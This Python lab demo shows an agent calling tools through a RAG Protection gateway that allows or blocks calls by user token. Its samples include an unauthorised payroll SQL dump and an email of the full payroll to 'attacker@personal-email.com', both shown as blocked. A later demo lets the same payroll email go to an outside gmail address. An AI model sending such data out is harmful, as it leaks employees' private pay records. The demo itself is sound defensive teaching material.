#!/usr/bin/env python3
"""Lab 1 demo — agent invokes tools through the RAG Protection tool gateway.

Prerequisites:
  bash tools/setup_venv.sh && source .venv/bin/activate
  Proxy running: bash tools/docker_start.sh

  export BASE=http://localhost:8090
  export RAG_PROTECTION_URL=$BASE
  # Or: export RAG_PROTECTION_URL=http://localhost:8090
  # Empty RAG_PROTECTION_URL (unset $BASE) falls back to http://localhost:8090.

Run:
  python examples/agentic/mcp_tool_gateway/demo_agent.py
"""

from __future__ import annotations

import sys
from pathlib import Path

_EXAMPLES_ROOT = Path(__file__).resolve().parents[2]
if str(_EXAMPLES_ROOT) not in sys.path:
    sys.path.insert(0, str(_EXAMPLES_ROOT))

from python.rag_protection_client import (
    RAGProtectionClient,
    RAGProtectionError,
    resolve_base_url,
)

EMPLOYEE_TOKEN = "employee-demo-token"
DATA_PLATFORM_TOKEN = "data-platform-demo-token"
HR_TOKEN = "hr-demo-token"


def _print_result(label: str, result: dict) -> None:
    print(f"\n--- {label}")
    print(f"Tool:      {result.get('tool')}")
    print(f"Decision:  {result.get('decision')}")
    print(f"Blocked:   {result.get('blocked')}")
    print(f"Reason:    {result.get('reason')}")
    if result.get("result"):
        print(f"Result:    {result['result']}")


def main() -> None:
    base = resolve_base_url()

    try:
        RAGProtectionClient(base, user_token=HR_TOKEN).health()
    except RAGProtectionError as exc:
        print(f"Proxy not reachable at {base}: {exc}")
        sys.exit(1)

    employee = RAGProtectionClient(base, user_token=EMPLOYEE_TOKEN)
    dba = RAGProtectionClient(base, user_token=DATA_PLATFORM_TOKEN)

    print("Demo 1: Employee agent tries to export payroll via run_sql → blocked")
    _print_result(
        "Employee / run_sql",
        employee.invoke_tool(
            "run_sql",
            {"query": "SELECT employee_id, salary FROM payroll"},
        ),
    )

    print("\nDemo 2: DBA token runs allowed read query → allowed")
    _print_result(
        "Data platform / run_sql",
        dba.invoke_tool(
            "run_sql",
            {"query": "SELECT employee_id, department FROM employees LIMIT 10"},
        ),
    )

    print("\nDemo 3: HR sends email to blocked external domain → blocked")
    hr = RAGProtectionClient(base, user_token=HR_TOKEN)
    _print_result(
        "HR / send_email (blocked domain)",
        hr.invoke_tool(
            "send_email",
            {
                "to": "attacker@personal-email.com",
                "subject": "Payroll export",
                "body": "Full payroll attached.",
            },
        ),
    )

    print("\nDemo 4: HR sends email to regular domain → allowed")
    hr = RAGProtectionClient(base, user_token=HR_TOKEN)
    _print_result(
        "HR / send_email (allowed domain)",
        hr.invoke_tool(
            "send_email",
            {
                "to": "host@gmail.com",
                "subject": "Payroll export",
                "body": "Full payroll attached.",
            },
        ),
    )

    print("\nList tools visible to employee:")
    listing = employee.list_tools()
    for tool in listing.get("tools", []):
        flag = "allowed" if tool["allowed"] else "denied"
        print(f"  - {tool['name']}: {flag}")


if __name__ == "__main__":
    main()
